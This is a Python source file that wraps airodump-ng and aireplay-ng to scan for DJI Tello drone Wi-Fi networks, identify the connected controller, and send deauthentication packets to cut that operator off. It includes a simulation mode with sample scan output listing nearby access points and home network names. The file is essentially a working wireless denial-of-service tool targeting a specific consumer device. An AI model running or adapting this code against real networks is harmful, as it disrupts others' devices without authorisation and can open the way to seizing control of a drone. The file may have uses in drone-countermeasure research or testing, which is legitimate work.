import subprocess
import os
import re
import time
import sys

sim_ap_table = """
BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
C0:05:C2:86:9E:D1  -81        3        0    0  11  130   WPA2 CCMP   PSK  VM7284691
D2:05:C2:86:9E:D1  -81        3        0    0  11  130   WPA2 CCMP   MGT  Virgin Media
48:D3:43:4C:D1:B1  -49        6        0    0  11  130   WPA2 CCMP   PSK  VM9051988
AC:F8:CC:69:39:08  -77        4        0    0   6  130   WPA2 CCMP   PSK  VM2349028
AE:AE:19:02:24:3C  -69        3        0    0   1   65   WPA2 CCMP   PSK  <length:  0>
E0:63:DA:65:13:B7  -83        4        0    0   1  130   WPA2 CCMP   PSK  VM2349028
00:8E:F2:B1:7F:9A  -83        1        0    0   1  130   WPA2 CCMP   PSK  virginmedia8888296
84:0B:7C:FF:50:28  -30        9        0    0   1  195   WPA2 CCMP   PSK  VM2F5028
90:02:18:F7:64:24  -75        7        4    1   6  130   WPA2 CCMP   PSK  SKYVIDVJ
AC:F8:CC:3F:60:C9  -68        5        0    0   6  130   WPA2 CCMP   PSK  VM4307236
80:3F:5D:52:DA:3E  -76       11        0    0   6  130   WPA2 CCMP   PSK  E300_EXT
60:60:1F:DC:61:51  -35       10      245  116   8   54e. OPN              TELLO-DC6151
00:1F:01:80:E8:10  -82        4        0    0   6  130   WPA2 CCMP   PSK  VM4307236-PRO-2.4G
BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
(not associated)   BC:6E:76:37:C8:48  -76    0 - 1      0        2
48:D3:43:4C:D1:B1  38:D5:47:3B:6D:D9  -62    0 - 1      0        1
00:8E:F2:B1:7F:9A  02:49:D7:9F:A3:DC  -69    0 -24      3        2
60:60:1F:DC:61:51  16:C0:4B:0C:DF:3E  -38   54e- 1      9      249
CH  2 ][ Elapsed: 0 s ][ 2022-07-11 17:56

"""

sim_op_table = """
BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
60:60:1F:DC:61:51  -29 100       85     5987  637   8   54e. OPN              TELLO-DC6151
BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
60:60:1F:DC:61:51  A6:B2:E7:B0:9D:E3  -34   54e- 1     47     6022
CH  8 ][ Elapsed: 6 s ][ 2022-07-11 17:57

"""

def escape_ansi(line):
    ansi_escape =re.compile(r'(\x9B|\x1B\[)[0-?]*[ -\/]*[@-~]')
    return ansi_escape.sub('', line)

class Aircrack:
    def __init__(self, interface, simulation=False):
        self.interface = interface
        self.simulation = simulation
        if os.geteuid() != 0:
            raise Exception("Script must be ran as root (sudo ...)")
        if not self.check_monitor() and not simulation:
            raise Exception(f"Monitor mode not enabled for {self.interface}")

    def detect_ap(self, timeout=3):
        if self.simulation:
            time.sleep(timeout)
            return sim_ap_table
        return self.detect_cmd(['airodump-ng', '--essid-regex', 'TELLO-', self.interface], timeout)


    def detect_op(self, bssid, channel, timeout=3):
        if self.simulation:
            time.sleep(timeout)
            return sim_op_table
        return self.detect_cmd(['airodump-ng', '--bssid', bssid, '--channel', channel, self.interface], timeout)


    def deauth(self, ap, op, count=0, timeout=0):
        if not count and not timeout:
            raise Exception("Must specify either a count or timeout")
        if self.simulation:
            if count:
                sys.stdout.write(f"Simulated Deauth packets sent {count}\n")
                return "completed"
            time.sleep(timeout)
            sys.stdout.write(f"Simulated Deauth packets sent {timeout*50}\n")
            return "completed"
        cmd = ['aireplay-ng', '--deauth', f'{count}', '-a', ap, '-c', op, self.interface]
        if count:
            subprocess.getoutput(cmd)
            return "completed"
        self.command = subprocess.Popen(cmd)
        time.sleep(timeout)
        self.stop_running_command()
        return "completed"

    def stop_running_command(self):
        self.command.terminate()

    def check_monitor(self):
        interface_details = subprocess.getoutput(f"iwconfig {self.interface}")
        return "Mode:Monitor" in interface_details

    def detect_cmd(self, cmd, timeout):
        table = ""
        temp_table = ""
        table_start = re.compile("\sCH")
        start_time = time.time()
        self.command = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True, bufsize=1)
        while time.time() < start_time + timeout:
            line = escape_ansi(self.command.stdout.readline()).strip()
            if table_start.search(line):
                table = temp_table
                temp_table = ""
            temp_table += f"{line}\n"
        self.stop_running_command()
        return table